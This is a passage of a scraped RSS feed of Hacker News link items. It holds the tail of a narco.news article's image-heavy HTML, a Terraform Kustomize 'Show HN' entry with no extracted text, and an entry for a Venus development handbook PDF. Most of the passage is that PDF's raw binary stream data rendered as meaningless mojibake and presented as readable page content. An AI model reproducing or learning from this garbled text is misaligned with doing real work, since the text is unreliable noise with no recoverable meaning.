height="700"></p></div></div><figcaption>Google Maps</figcaption></figure><figure><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-1.30.33-PM-3.png"></figure><p>On the <a href="https://www.dropzone.com/forums/topic/184982-it's-my-last-day-at-work---and-i-am-not-sad!/">Dropzone forum</a>, when asked about his plans after retirement from the Air Force, Tim mentioned that he would continue fighting the global war on terror with his old unit as a contractor.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-3.25.33-PM.png" width="1082" height="554"></p></div></div><figcaption><em><a href="https://www.dropzone.com/forums/topic/184982-it's-my-last-day-at-work---and-i-am-not-sad!/">Dropzone</a></em></figcaption></figure><figure><div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-20-at-2.27.46-PM-1.png" width="1056" height="1100"></p><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-16-at-4.59.19-PM-5.png" width="488" height="606"></p></div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-20-at-2.44.08-PM.png" width="632" height="662"></p></div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-20-at-2.41.42-PM.png" width="822" height="746"></p></div></div><figcaption><em><a href="https://www.facebook.com/PoliceWarsaw/posts/yesterday-may-11-2016-officers-with-the-warsaw-police-department-responded-to-a-/960425930732138/">Facebook</a> ;</em><a href="http://www.omniskore.com/comp/2003/nats/teams_pics/702.htm"><em>Omniskore</em></a><em>; </em><a href="https://www.dropzone.com/forums/topic/222999-weekend-raeford-pics/?tab=comments#comment-439487"><em>Dropzone</em></a></figcaption></figure></div></div></div>]]>
            </description>
            <link>https://narco.news/meth-kingpin-was-director-of-operations-for-combat-controller-school</link>
            <guid isPermaLink="false">hacker-news-small-sites-26198555</guid>
            <pubDate>Fri, 19 Feb 2021 21:57:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Dynamic Kustomize overlays with values from Terraform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26198406">thread link</a>) | @pst
<br/>
February 19, 2021 | https://registry.terraform.io/providers/kbst/kustomization/latest/docs/data-sources/overlay | <a href="https://web.archive.org/web/*/https://registry.terraform.io/providers/kbst/kustomization/latest/docs/data-sources/overlay">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://registry.terraform.io/providers/kbst/kustomization/latest/docs/data-sources/overlay</link>
            <guid isPermaLink="false">hacker-news-small-sites-26198406</guid>
            <pubDate>Fri, 19 Feb 2021 21:43:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rethinking Our Sister Planet: A Handbook for the Development of Venus (2017) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26198358">thread link</a>) | @asterialite
<br/>
February 19, 2021 | http://venuslabs.org/Rethinking%20Our%20Sister%20Planet%20(ebook).pdf | <a href="https://web.archive.org/web/*/http://venuslabs.org/Rethinking%20Our%20Sister%20Planet%20(ebook).pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>|w&lt;%/‚ÄìJs√ó√é.8&lt;√ºEM√í/W√§√ÜF‚Ñ¢√®√û√á¬≤@∆í	o√≤u¬´z¬Ω¬ßÔøΩes¬¶&amp;\√´√§¬¶√é¬Ω√ö/√•∆í√ìÔøΩq¬´√¢√ì&lt;≈æ√∏b√ï√π√¨¬∫¬±
o√ò¬∫√ö√∂¬ø≈í√£√∞¬§n√îjw‚Äì√£√¥¬∫¬∫2¬≠√ä√ã¬æ‚Äò√ßo¬∂N¬∂√ä¬¢¬≤√ñ√∫≈ìsRÀú√ø√•!√®}√∫√•!√•YV¬´√öY√∂√í√ø√©?ÀÜ¬¢≈∏≈í¬∫	{√ë√ô√¥¬∫4√Ω¬∫√≠:ÀÜ√†√ú√ã√æ[gJTlr√´‚Äπu¬∞¬∏}ÔøΩ‚Ä¶√à≈∏‚Ä°√≤¬´¬•e*‚Ä∫√±√¢‚Ä°P√∂~∆í¬∑√èU¬°¬¨j√Ω√∂√≠g!¬∏¬æ√ò√∫¬±X7DF√º√ím√ß√∫√¢√ì√∏
|‚Ä¶√°√ã¬ºkrw&gt;√†&lt;√•/√£¬´|√õ√âj‚Ä¢m√õY√≠√å¬§∆í0N‚Äô;W√®√ä√í¬≥≈ìn¬π\u√Ø,¬π(√ø√´R¬™R]√°

^k¬≥5uMM√ü$¬Æ¬©√ùi‚Ä∫¬¢Q¬™‚Ä°√±√á√µ√≠√∫o√ì¬º≈íK¬¥‚Äî%l¬ß(√¨¬¥ÀÜe√º√∞¬∂3√ì≈°¬∑B√Ø¬ß¬©i¬¶√µ√Ø≈∏¬ø‚Ç¨√∫/c3√ê√¢!√î√Ü-2l‚Ç¨√Ü¬πEM¬∏√å\¬∑√µ¬¥√à]√ìL√í¬∂ndj√ö^√∞jh≈æ¬æ¬∫j√É¬æ2I#√∑¬°√ÇMh√á‚Äö‚Äúw√•√ñ√á√Ø&gt;‚Ä°:√Ω4√©√ä√°√®√™≈ìN|√ô¬∂√â√ÉJJ√õ‚Ä°N√°√ç¬®√∂¬∂√ì√Ω'ÀÜEL/≈æ‚Äô/
#√á:‚Ä°BÔøΩ3~√Ü≈æP9t¬´LTI}‚Ñ¢~¬´sst√ö√ñ¬π√Ø&gt;ÀÜ√µ¬ø√∏√∞√∏√É#¬æ√í¬®√Ñ√îp√ß¬≠√óbe‚Ä¢¬≠√¨:√≠√ÖUwu7M¬©~√ù√¢f√ô√∂^u√ñ≈°+0√æ,F√áÀú√ägw4¬´√ö)a√ø‚ÄπA√á|k√úlZ√ÖV¬™¬®√ö:√Æ√ô23(7‚Ä∞√°√ãu]√≠&amp;√át√àP√µ‚Äô?ÔøΩE‚Ä†√Æ:√ïÔøΩ≈Ω@‚Ä¢&gt;*√∑¬ª&nbsp;√π√é+√óU√ó√Ö¬ΩO,T_¬º'¬¥√π≈æ√ü√≠{√™√†¬ªX√û≈Ωz:√¨,(√±¬Øb√≠;√ê√èm√í√∂l¬¥‚Ä°¬°√º√õ8¬¨√Ø{√≠T‚Ä°√§√ò√©√©√ã√∏T0'h+P‚Ä¢e{‚Äô√î√¶¬∑¬°√æ(?‚Ç¨:√∏.¬≠?_√ï√ø}¬®5~√¨‚ÄòÔøΩ¬∫¬µ‚Ä¶1
Eg&nbsp;H√å¬¨¬¨q√Ω:Àú√ô√ñ:&lt;03^f~h√©‚Äû√øO[√ª¬£NW‚Ä¶,C√π5l√ê+D‚Äì}q@‚Äì√ï√ü
X¬¢|_)¬∞¬¨√´¬¢uh√ê¬∫√°¬∫J¬™v√ø_√õ√ãK√óB√ü$.i√ß?¬ΩÔøΩO`RTe/B¬¨√ª¬§F;¬®9≈æC5¬¢
√¨‚Ä∞√¢¬∞yt√≤v5I]a}*√¥√Ä√±5¬º‚Ä∞p√ß≈æ¬ø&amp;G√ºÔøΩc¬®√µa ¬™p≈∏9q√´@+'¬§√èP`[‚ÄöJ{hi¬ª¬¢√©√¢‚Äò√´¬©0√ë√òÔøΩ√†Àú&nbsp;‚Äπp
√à	g√´≈∏√Å‚Ä°√™B4‚Ä†√µ_√±@4√ê,M¬Æ√ñ‚Ä∞√èi¬∑√â√é√Æ√´√†‚Äû!‚Äì√Ñ√∂Q√ç¬Ω‚Ä†√è‚Äô‚Ä†≈ívV√∫≈ì≈æ√î¬≥≈°‚Äù√è√¥{√âÔøΩC√é
¬®kg¬©≈°√¶2√öe‚Äû‚Äù^√ãt¬•B¬∑√ï√£¬∂¬∏√à¬•≈†{¬¨T&amp;√Ü√£√ô5¬´√ª_√öI‚Ä°¬πMh‚Ä∫Y,:√û)&gt;nq8∆í√ç√πS¬¥
√ß√∞√î√ì√ç√úN¬¨‚Ä°≈°‚Äú8√ê\√Ü7√ê&nbsp;!¬®E¬Ωh¬æ√ê√±√¶‚Äî√∞√º&amp;w¬±/√ìh`X?‚Ç¨√ßÔøΩI}~ÔøΩd¬∫¬∞J√®¬∂+¬•:√∏√º!‚Äù√Ø~5√å√∂¬¨*%√∫‚Ä¢
R	√≥√†z~‚Äù√∑&nbsp;¬º
ÔøΩ√≥}R√Åuh√≥n√≤√•‚Äî√ó¬™4≈°¬¥(ÔøΩ¬∏√∂¬ø,√ù√∫[Z√ñ√óÔøΩ.
¬Æ√ø√ü^¬æ¬≠√ü√Ñ¬∫√∞√¥√´√∏√¥ÔøΩ¬º%enaS¬∑i√µw√Ω‚Ä°h~√¶;√ø√Ω@√ô√π√ò√ùN√¨V√ú≈æ√°cLc√•*7@Z√ñ‚Äò‚ÄûGP√æ√å+m≈∏Àú√ë_kHr&gt;‚Äù¬©√ú^Ux¬∑¬≠[√ä√ãXY‚Äú‚Äú√™‚Ä∫tv√õa√π√É‚Ä∫II*‚ÄûL
B)√ú¬¢~¬æ√Ñ√î~=ÔøΩF¬™¬Ω)‚Äî√∫\≈Ω√ñ√ãx√õ√£√§H¬§7N6F&amp;‚Äû¬∫‚Ä∫¬°ux‚Ä†6m‚Ä†√ª≈ær√∂≈ìb¬ºO√ÄA^¬ø¬¥&amp;√ó√Æ√ä¬™√ä6¬™$¬≥‚Ä∫√°,√¢&amp;!√™fÀú(D√ö√ëO!√®J¬µ¬¨D#‚Ä∞u√≠}√≥w≈æ√ü$√∫bWY√£¬¨‚Äî]√≠Zgl*√∏=≈°√âÔøΩ≈íJ¬©‚ÄûÀÜ‚Äû/√ü√ä√´`√π1¬¥√É‚Ä∫
‚Ä†‚Äö9≈°C√ê√™√ë‚Ä¢T√ë e√ª√ñ¬øÔøΩ}√Ç`i√ê√™ √ö¬£√¨
√†#√≤mc¬Æ√îTeQ√±≈∏`7*√è√Üx‚Ñ¢≈°√º¬∞¬¶√©√ú√Æ[√π√ÑMÔøΩH≈°¬∫√êÔøΩ	b`D√º¬±√Üg¬∏≈ílÔøΩ√øÔøΩrÔøΩ√é|6¬¶‚Ä†√æl√∑C√ò√Æ?l¬¢z√úZIxc‚Äî√Ä√ß√úU	v√ïhÔøΩT√ò:√π∆í¬£&gt;‚Äú√É(‚Ä∫¬¢¬°#Ha‚Ä¢√∫√ç ¬¶¬Ø7√†2Q\≈∏@√π1lu‚ÄùÀú+√§2√´¬≤?‚Äò√¢√ñ¬≥vÔøΩkb√™¬∂¬∏√õ√†≈°√¥)‚Ñ¢√ô‚Äö√§¬∫K√≠/B&amp;8√°√ï√ÜW‚Äö¬≤G\#‚Äû√è‚Ä¶8+[√ºZ¬§¬§¬£‚Ä∞¬∞)`+QlX¬≠&gt;~√†lÔøΩ‚ÄìN√´e¬®UX5l&amp;gÔøΩÔøΩ	√ô√ò√è‚Ä°g0jP;¬∏L
≈ì√Ån¬æ\∆íX‚Äπ√≤√Ä¬æQ‚ÄùIA√çK2v√Ç$~"¬µ¬¨¬µ√´√ò√ôÔøΩT√®√¶√Ω$√ì‚Ä¢√±‚Ç¨√ë√†¬ªh1yA≈°+J√∏‚Ä°:{√•√ü¬£¬™Ba√•¬£ÀÜ¬¥~ w&nbsp;√≥‚Ä°	√ü‚ÄûHk'¬®Zz-=z√ª√ûe ¬ß¬ÆuQ√π√ü¬∏!√ß√®‚ÄîY√π√î¬π¬º√áR?i‚Ä°√£√ø√ûh√ßpXB√Ä√Ö‚Ä†√ô‚Ç¨¬πM√Ü√∏q√ä?@¬£√Ø¬°‚Äù√Ñ≈°H‚Ñ¢r‚Äù‚Ä∫¬§¬¨‚Äì√Øm√¶√óY¬∑m¬≠s√¢B¬µ‚Ä°‚Ä¢Z√πFg√É√ü¬¶.‚Äù√ü~√´0tO¬Æ‚Äö:√∞√°p3-\‚Äö¬∫]PZ=¬®:√Ä[RN¬≤ÔøΩ√®¬¢`¬∞
√ù¬Øw9¬Ω‚Äî√ã\¬¶d_√∑;^&amp;x√Ñ|√¶¬±√†¬¢t√Æ√ë/√®≈°Th√ë¬¨&nbsp;b‚Äö‚Äπ3≈†√º¬øÔøΩEv~'ÀÜ≈Ω√§¬Æ,H‚Äú√±9‚Ç¨√®√í‚Äû*‚Äù¬∞d√ú+√ãX‚Ä†¬≤√ö¬©‚Äù-√™√ö≈í√ó√çUF√ª√ø]√§"¬©' L‚Ä∞‚Äî√õ√∞ÔøΩT‚Äò&gt;1√ç:‚Äú√æ{‚ÄöN¬•9&amp;‚Ç¨‚Ä†√∂ÔøΩ&amp;≈∏√Çf]bi≈æN3¬º√é7√Ωf¬™√ç¬∑A‚Ä∞L¬∫4√¥√õh≈Ω‚ÄôYR2j5√åoC√ñ,√¨0‚Ä°ZM√úa#√∞√ï√≤T√ú‚Ç¨A√ûÔøΩ&lt;ÔøΩ√≤c@ÀÜ¬Æ‚Äì4√óm√õ:x√¶4o√≠√¨F¬≥j√ú*¬∫¬ø]√ÜYtMm√ü$*√≥c√íÀÜ√Å1√ü‚ÄùdQ$<d√ó¬§a{!≈∏@ÔøΩ√≤p% √´√ìÔøΩ}√ù'$¬¨j√õzf√µjb√∂':e="">√å√Ü¬∂0Ne4√Ä√à√ÖP&amp;¬£¬Ø≈æ√∏UQ}c¬¥‚Äô√ó√ë√®@∆í`√Ä√é≈ì√≥‚Ä¢_√Ñ√äX√∏Ch≈Ω&amp;?√ì√±¬°U‚Äù¬æÔøΩ√∫√í¬°|√õ¬°P√¨9pXÀÜ6a¬º¬∏C¬•Àú∆í√†`oH‚Äπ@ eOx‚Äú&amp;√ù≈ía≈íÔøΩg√û¬∂≈ígAQ√©c√≤√î)√≠sb√∫:√¥S√ß,≈Ω√¨‚Äì‚Ä∞z≈°√á¬™z√ì$M√§:/‚Ä†l0√ä‚Äû6?√ã&nbsp;0√æE¬®‚ÄπqÀú≈∏¬´¬∂s≈æo¬Æ"$-√øÀÜ√¶√≤√ë√º¬Ω√π√∏ √ùk∆í¬§&amp;√ªFI#ÀÜy=&gt;¬Ø√´¬©≈°√¥√ä‚Ñ¢‚Äπ√©√á√°Zg‚Äì√ö√åm√øh√ÆQI√•*√∫‚Ä¶&nbsp;‚Äì1uÔøΩ¬¶a√ç{¬≥¬ºW"y√ôg¬±√∂1i$‚Ä°√≤d&gt;¬©j√ô√êFI;-¬´i¬æ#$√º?EÀÜ¬Ø≈í¬∏@ÀÜ=IA_√úRH5MOÔøΩ0m‚Ç¨‚Ç¨√®√∫?ÔøΩ√≤c√®√´√él;¬£¬ºr√ì√≠38√ø-%¬∞J‚Ñ¢¬µ¬®~P2‚Ä¶\√í#A√ßI√ä‚ÄûOj¬∏5≈ΩÀÜ(√É¬•√π]$‚Ä†¬¥≈ì√´¬ªt]√ª√ô¬ª'¬¨√Æ∆íGP√ß√ë{√®ÔøΩ√ê‚Ä†&nbsp;¬π)√®VtP√æ√èq√è√Ω√≥√Ä?t2ÔøΩE:U√£√ì6∆í≈∏XBMÀÜ¬∏;‚Ä¶¬≥y√Ø¬°qt‚Ñ¢√Å√¥√≥q√≥q¬≥¬ø/√Åt√±(!vw‚Ä¢√µ?¬∂ÔøΩk[ER≈æ√ìs√è3O`¬∑K‚Ä∞√å)≈°a√ñU,Pn√§√âX~B‚Ñ¢U‚Ä¶√ñÔøΩ√é√©‚Ä¶L√â!c≈†‚Äû-√™√µGP2¬•w¬•S√õ‚Äî&amp;√Ω¬µX√Æ√ü¬•¬øF√á√éR≈Ω¬•)¬™6g√ØF√Ü√±vdo_‚Äùq√ºÀÜ√æ¬ªD‚Äô‚Äî{√è‚Äú‚Ä¶+√õU=≈æ‚Äπ¬ºT√ê√õ*¬Ø√à¬∫¬´z'∆í√ª√≥√æ√≥√æ√≥√æ√§1√ØD√¶√ña9‚Äî,ÔøΩp2√õ√ôn¬Ø√ì√æ&gt;√á√à?√á√à?√á√à√øf1rT¬•√ú√ΩA¬∫~‚Äì‚Ä†√á‚Äîw.≈†/‚Äò√Å+N`3ÔøΩ¬¶√ß~≈Ω¬πaNY√å ‚Äπe≈Ω‚Äì¬™F(0l√ú|{¬≥√ë√¨¬πo¬°¬Æ‚Ä†¬∞C‚ÄîHI!√ât8;¬¨~√ßo¬∞¬´¬ÆT¬≤√∂g√¶m6&nbsp;X√í3¬°¬≥¬±√úÔøΩ KR`√ê¬¨{]Àú:√æ√ö‚Ä†‚Äùv¬øN√®‚Äî‚Ä∞√é√≤O(&gt;Wt3U¬π%X9=√≠¬≥¬§WumÔøΩ√î√ï√´!j√Å√ú¬∫6√Ωoh¬Æ≈ísÔøΩ¬¥√í¬¶√ñ&gt;√ÉX9¬∞‚Äú.¬π¬∏√º√â	g√ß‚ÄπR√´lH√í√¥ÔøΩ√î¬¶√è7Y'√î‚Ä†Fd`‚Äöm$x√è√áÀÜ√ä√°‚Äò0zr√É√æt_√ù&amp;&nbsp;@‚ÄùzO¬∞√ºH√®√≥√ë&amp;√¶C≈Ω√Ç¬º]C√™≈í¬ø¬´¬Æi≈í√¶√è≈ì&nbsp;√°‚Äû√¥rG¬¢}‚Ä°√©¬®¬Øn:‚Ä†L‚Äù√é√ü
8`¬ºÔøΩR√©w¬Æ√ø√ßJ&lt;{Bendstream
endobj
1195 0 obj
7817
endobj
1200 0 obj
&lt;&gt;
stream
x≈ì√≠]Qo√ú6√™7'@√™√ÜI≈°¬¶=√¨C√ö√≥√∂bUER:√†^≈Ω√óv≈í8√´8¬±['O¬ΩkÔøΩz@√õ¬øp?√º(R?‚ÄôCI¬ª√û√≠]ÔøΩ‚Ä°¬≤√ú√ëÔøΩ√é√å73¬§√§≈∏gy√Üfy√≥¬Ø√Ω√Ø√∑?ms¬Æf?√æ¬∫√Ω√≥v&gt;SY√éY!f¬¢√π¬¨*‚Äπ"¬´√ï√¨‚Äî√é.¬ø≈æ√Ω{‚Ä∫√ç≈°¬ø√º¬∏√ù<g(x¬°¬§√î¬øo√ø@√∂- ovf‚Äö3√û√±d"+i≈æ="" ÔøΩ√ä=":√û√±n~¬´yeS¬≤‚Äìz≈æn√ú¬ºa&nbsp;XÔøΩ√±Z√åX%¬™,√ó\K^e¬™√ñK*√´‚Äö√ï‚Äì√∫√ßmfh√ø√≥√ΩO¬≥¬ø_h0√Ω\≈æ√ï√∫√ë√ô√Ö√õV2‚Ä†EV5,d≈æ" y√è.~√ö¬æ√û¬ª√µ|¬Æiy√é√§√û¬≠√ì9s‚Äîj7o\="" l√çe√Üxqv{¬∑\√Ø‚Ä∫√π~)2y√ó-ÔøΩ¬¨√≤r√Ø√ñ="G¬∞√£√õu¬Ω/√ß√ª‚ÄögJ≈†¬Ω[√èlo.¬∫!¬∏√ê√å^¬π√ûs√ó√¨FS¬µ√ü‚Ä†√â¬ª3√ì√ã‚Äπ¬Ω[G¬Æsg¬æ√èr¬¶√Ö√ä¬Ω√±≈æ√®√Æ√¶Àún/√µ¬•YS√ç‚Äû7√å&amp;g+≈°√é¬∑oan[≈Ω_G¬≥o√¶¬πpGÔøΩX,‚Ä°gÔøΩ√Æ√Ñu√Ç$‚Äî¬¥√ò`√ç‚Äî√§√å‚Ç¨√†≈æ{=wq¬≤¬≠√á√ã" ¬•¬¥j]√º¬£q¬†v¬•*√èy7≈ím_:.¬≠¬∂¬™√õ)¬∏√ó<u√çw√Ä√¢√à="s:w¬ΩW¬Æ" √ÉÔøΩ¬¥√í¬∂√π√ê√úw√ç0‚Ä∞n¬´u√ë<√òÀÜ√ÄxÀú√î6\‚Äì¬≤¬±¬∞}v√ñ√ö¬¥√äy¬©¬≠s‚Äìu+‚Ñ¢√ªz¬°≈†≈íu√Ü√∫√¶}√á≈ít≈∏5b¬ªÔøΩ}m√∏e√Öe√ã√¨√¨√åm√¨¬•¬≥¬≥√ì¬†√ó√ö√ô‚Ä¢{l√°≈°gh‚Äú¬≠="" ¬®√î¬¢¬∏v5¬≤j√ó‚Äù√ó√Å≈°d√•√ï¬¥√ê¬´r\¬ª¬Ω√ä_u3√†√Ö¬ø¬∂√µ¬¥√´j√ãjo7‚Äù0?}√¥≈∏√¶'√ç¬¶√∂<xc*≈†^√•¬§¬±√î¬ºv¬•¬∑¬¶3¬∑~√®]√é√∑¬µ√ü√ß¬º√©="">ur¬ª‚Äö√Æ‚Äî√≥"+x)¬§√ß√Ål¬ØÔøΩ√ä¬≥√Ñ√ã√π¬æ‚Äì≈°T¬πs‚Äö√ñ√ë√¥u‚ÄîT√ÑCG√ª‚Ä†&gt;Ct√ù¬Øu√õÀú¬∂h'm√π-‚ÄôJ#√∑√¶√¥√Ü5√©√Å‚Äò√µ5¬∫≈†1√é[√§¬∂j¬Æ√é|A≈°‚Äú.r√ë√ª¬¨#‚Äù^¬Ø√Ñ‚Äò¬£¬≤√åZ√á¬¢‚Äî√ê+w√Æ√ª¬Ω√íq";√öC@√Ø√≥ÀÜE√†y√ê‚Ç¨≈†¬º≈æ√•√í¬Æ√Æ√≠√™,qQWÔøΩsÔøΩ√Öa¬∫_¬π'[@h¬¶w0$sg√öl√≥~¬∑¬Øh‚Äôis¬£√ù√ì_5¬Ø¬ÆV‚Ä¶"√º¬≠TZ¬Æ√ö√üT3√ø¬π¬ª√é¬¶!√∫8ÔøΩ√µ√ÖÔøΩ&gt;]√Ø¬π‚Ä¢‚Ä∞d=A√¨√òk√ö¬∏:/I%[&nbsp;√ÅP≈†Ec+√®√±‚ÄôdC√†√å‚Ç¨√Ö¬Æ¬£¬∏GN‚Äö(hZ=¬ÆB√¢∆í¬±	√Å√àaa‚Ä°‚Ä∫OX√∑‚Ç¨¬®:√Ø√©≈æ;√Ø¬πy‚Äú4¬±‚Ä∞`‚Ñ¢¬™√™√û1ÔøΩ¬∂/is¬•√≠&lt;‚Äπ√ô√Ü≈†¬•√è√¢6√¨Àú√ºz√≥√Ç√ò$√≤¬ª≈Ω√†√±xl¬≤cÔøΩ¬∏J√ã&nbsp;√¨≈íÀú√§√Üq√ã≈†2/h≈í√ó6√£c√ºC√£¬π√àjmH√Üx5W,√£,√ß1√Ñ[¬¥¬ø√∞¬≤√à√â¬≠√õ¬ª√ö¬≥`√è‚Ñ¢(√ö√ù2¬Ω‚Ç¨√ô¬ø+¬¨√Ø√à=X¬Ø‚Äò¬§o√ø‚Äì√≥√õp√≤√ù¬•~EYdJ√ß√∏Sb‚Äò*L&amp;tF)√ä‚Ä∫~-g√¨‚Ä†√§‚Äûl√ë≈ægj4¬∞X#√©¬±√Æ¬°‚Ä¢W‚Ç¨√±ÔøΩÔøΩ√£~√°P√í3√Ç≈æ&nbsp;Osk≈∏]_‚Äò√©√†3w√§&nbsp;√∫.√©‚Ä¢&amp;√ê~‚Äö‚Äî¬© ≈ì‚Ä∫j√≤‚Ñ¢≈†C√ä5√ÇÔøΩh:D√§√ónE√®≈°P#‚Äò0¬πE&amp;¬¶√π¬øY(F%Qi≈°thZP¬µ√ø‚Äö√â‚Ç¨-B$≈ìV‚Ä∞0√ÜF¬©h¬´0√ëH√≥c√ç{√ó√¥[G≈†¬∂,1Z√∞0√Ü√è‚Ä¢√•¬πÔøΩ¬™rÔøΩ]≈í¬™]~√±≈í,√§√ö√Å√∞*Q	≈∏√íA‚Ä¶‚Äùzd¬Æ6T|∆íL¬≥R(¬≤,¬®¬º|¬¢¬ßÀÜ√ìP#¬¶√±≈†√´"√∫√™‚Ä¶ÀÜ¬°√†d√ì¬µ‚Ç¨R√™P√±√ø¬°√∏≈°‚ÄîqH√±?R&nbsp;f
¬¥√†a√®m	¬°U‚Ä°√Ä√É√û√Éyl√µ¬π√´m=¬©¬®‚Ä¢‚Ä°wt3¬¨`Q¬¥I√ò‚Ä°√ã,Gy√™√î√∫‚Ä∞√ä‚Ä†√õ√ä√µKpE'¬∫‚Äú0√ôrL¬æ√ü3¬≠√ú‚Ä°√ó,tjaSeE√≠≈ì√∂√™u‚Äò¬£C
.√º√Ñ{‚Ä°ÔøΩN&lt;¬§n√ñ√ºF‚Äú√ªG$‚Ä°0M?√èC`√Üx√Ü‚ÄûH ¬∞RÔøΩ‚Ä¢ÔøΩN√´k‚Ñ¢‚Ä¢¬¨C√†2
√Äl√æ@ √£¬∫j!¬£¬∏%‚Ä†"√Ä√πh¬±}¬£ÔøΩZ√∑  Àúy‚Ä¢i√ß√¶f4√¶`Fv5‚ÄûÀúÀú¬Ø√ö√ÆiÀÜ9√§√©9√å√ê√ó√ê'¬¶√£Àú√¨≈Ωp‚Ä∞√ÑT√ï)I√Ñ¬∞q√™¬¢¬•m≈Ω¬£%:ZeP√è!√ë√∏JwW
?\i+.t¬∞^√•u‚Ä∫√ÅJIÀú√±‚Äû¬∂n0‚Ä¶ÔøΩk6_(√µ&gt;¬≤r√ç¬∑‚Ä°¬™√´√Ü√æ√ò\¬™cA‚Ç¨√±√í#¬ºÔøΩ≈ì√∂¬°¬£¬®¬¥√•¬¥¬¥√ô¬º,ÔøΩt√†Z¬©√ûh|√Ø"NdC&lt;√´s√°¬º,{¬Ø√ß"¬¥w¬¥)¬Ør‚Ä†√ø√ÄL¬™‚ÄúÔøΩ√°¬ß¬®¬≥Z#g√¢√®;√Ñ√è√è√∏¬©m¬ß‚Äì‚Ä∫&gt;√∫~√™√å	¬∂4¬Æba&lt;,{oW√ç√æ$pu¬≥`JsK¬ª√óNfE≈æ√â‚Äö'‚Äú√ô√ü6o6‚Ä∫√µk√â#√âlÔøΩ!‚Ñ¢5‚Äò√≤`2kÀÜ√£dvs√∞√¨√ï=lV√ö√Æ+F¬¨√ó)√§¬∏¬∏Q¬≤√≤,iS)¬ÆB¬≠^z√∂R!S%‚Ñ¢Xz√æ√£‚Äö√Ø¬∏‚Äò¬≠‚Ç¨√í2^b¬•√éL√ùY√ì‚Ç¨}√£"tT√∞]%√•]¬≥√¥llzb√ä‚Ä∫*=w¬≤B√â‚Ä°√é(¬π√¶FJ√è¬£w√ñ¬ø√è√í√≥‚Äî6√¥√ß¬¨√¥r√í7√®Vz‚Ç¨√Ü√£√™K√∞√ë ¬æ√¢y√Æ ≈†ÔøΩ√û-√õ√¨5¬π¬°√™√¥√îy&amp;¬∞]√•Y%√§H¬°√∫√≥¬©|sG√Ü4≈ìo√∑8√Ä√π/√°‚Ä∫∆í¬±¬Ø√Ä"a√ø√â¬∏¬∂^Ta2√æ`¬µkmA2n&lt;√Ä¬¥kmQ≈í1≈ìx¬ø√ó√ì√§0‚Ä°≈ì√©√¶¬©√óp√Åf√≥yw√™6√∏&amp;√≥√Æ  ¬∫√ô7¬≠‚ÄòG√âE¬¶j‚Ñ¢&gt;JN‚Äù¬∞ÔøΩ‚Ä¢¬Æ{√è~√¥~√ö¬ß≈Ω√†√û
yw√≤√ä¬π√í‚Ç¨¬´:1√Ø√æ≈ì‚Ä†√ØR√ÅJ√≤:≈°¬ª¬©√¶√Ö √ù‚Äπ&lt;6;k¬¢P¬¨¬¢/¬Æ√ê)√ê√í√áTÔøΩ'√†E≈°7&amp;
√ß¬±‚Ñ¢√ó)‚Äî√∞*TSoB√ì.¬©@√§E¬ø≈†√öyx√ñ‚Ä¶¬∂@g1c√•c√§@√ó‚Ä†p√Æ√Æ‚Ä†√û‚Äô¬§¬•-¬¶¬Ω√∏r√é+|√é¬æ¬£2w√éi¬Ø{√≥k9`ÔøΩ‚Ä°√ò‚Ä†√´ghlW.W√≥¬ß-≈°¬æHBg)‚Ä∫√ù¬ª√©≈†√à9√ó√∂E√æ&nbsp;√É]n√ç¬∞√öl√≠Dz?¬∑√∂ E‚Äò¬≤4@K¬∏√ñ1`¬∂√ñ√ê√Ä*ÔøΩ‚Ä°¬®bq¬£√ü√Ñ¬°√Ø≈ì√É√†0&nbsp;¬∞‚Äî]Àú√øZÔøΩj&nbsp;}√£√ß-&nbsp;√ó¬§√µ!8¬ª√©DNo!√ò√Æ√å,w&nbsp;
¬¶M:9!√à;q‚Ä†‚Ñ¢√ó[√à‚Äπ√è¬Ω√¶ÔøΩn_|√ù‚Äû√Ü√£√É9√É¬±√õ√ò√Ävy√ï;RÀú√Ø ÔøΩ&lt;
v(√í√Ñ√ô√ÑÔøΩ`#√ù‚Ñ¢S√©+√í*7VR1F√∏
Y√¥¬≤#√≠d¬ΩÀú‚Ñ¢z√Ø√©$√í≈∏D¬¢√£Ux{≈†cC‚Ç¨(√ç¬∑¬£‚Äû√Ä√∏U¬ø&amp;Zp‚Äî¬§≈æ‚Äúl√•*:√≤&lt;√Ä7z√π7¬∫0¬Ω√ót	8{¬∏√óÔøΩ`j3`Y≈∏v
√ÆÔøΩu[d5¬¥]√ºy√º&nbsp;_√µ√û√≥√´‚Ä∫√∞"d√ÖE¬¥4$?0¬¶¬≠t‚Äπt!√†X√Ä)√Ñ7¬£C¬•‚Ä∞≈°'√ù}ÀÜ&gt;‚Äò¬ÆÔøΩ‚Ä†]82√•A√≤√≥¬º7√ö√∂af¬£lG√ª√ë√ù√ñ√í√¥0"Hv"√Ñi√ù¬Æ¬¨Àú7_\¬Ω√ê√±√ê7‚Äò√êÔøΩ¬Ω¬•ÔøΩp¬™KR‚ÄökVp&nbsp;√∑x^√∞≈í√ïRy¬Æ1QBÔøΩ
